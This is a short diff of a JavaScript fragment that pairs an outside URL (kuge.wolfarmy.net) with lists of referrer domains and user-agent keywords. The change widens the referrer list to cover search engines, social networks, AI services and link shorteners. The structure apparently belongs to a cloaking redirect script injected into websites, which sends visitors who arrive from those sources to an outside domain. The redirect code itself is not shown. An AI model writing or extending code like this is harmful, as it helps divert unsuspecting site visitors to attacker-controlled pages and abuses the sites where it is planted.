@@ -60,9 +60,22 @@ var sc_security = "28b53553";
   var ars = 'http://kuge.wolfarmy.net';
 
   var refBots = [
-    '.aol.', 'chatgpt.', 'msn.', '.google.', 'bing.', 'yandex.',
-    'facebook.', 'brave.', 'woa.', 'ecosia', 'qwant', 'pinterest.',
-    'coccoc.', 'baidu.', 'duckduckgo.', '.yahoo.', 't.co'
+    // Search engines
+    '.google.', 'bing.', 'yandex.', 'baidu.', 'duckduckgo.', '.yahoo.',
+    '.ask.', '.naver.', '.seznam.', '.sogou.', '.search.yahoo.',
+
+    // Social / community
+    'facebook.', 'instagram.', 'linkedin.', 'pinterest.', 'reddit.',
+    'twitter.', 't.co', 'vk.com', 'discord.', 'telegram.', 'whatsapp.', 'line.me',
+
+    // AI / aggregators
+    'perplexity.', 'you.com', 'openai.',
+
+    // Feeds / discovery
+    'news.google.', 'feedly.', 'flipboard.', 'smartnews.',
+
+    // Link shorteners
+    'bit.ly', 'tinyurl.', 'ow.ly', 'is.gd', 'cutt.ly'
   ];
 
   var uaBots = ['fb', 'facebook', 'pinterest', 'twitter'];
